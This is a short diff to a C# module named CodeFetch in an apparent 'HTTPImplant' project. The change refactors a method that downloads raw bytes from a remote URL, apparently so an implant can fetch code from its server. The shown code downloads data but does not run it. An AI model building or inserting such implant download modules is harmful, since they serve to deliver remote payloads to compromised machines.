@@ -1,28 +1,26 @@
 ﻿using System;
 using System.Net;
-using System.Threading.Tasks;
 
 namespace HTTPImplant.Modules
 {
-    internal class CodeFetch
+    public class CodeFetch
     {
-        public static async Task<byte[]> FetchCode(string hostname, string port, string file)
+        public static byte[] FetchCode(string url)
         {
-            string url = "http://" + hostname + ":" + port + "/" + file;
             Console.WriteLine("URL: " + url);
 
             try
             {
                 using (WebClient webClient = new WebClient())
                 {
-                    byte[] buffer = await webClient.DownloadDataTaskAsync(url);
+                    byte[] buffer = webClient.DownloadData(url);
                     return (buffer.Length > 0) ? buffer : null;
                 }
             }
-            catch (WebException webException)
+            catch (WebException)
             {
             }
-            catch (Exception ex)
+            catch (Exception)
             {
             }
             return null;
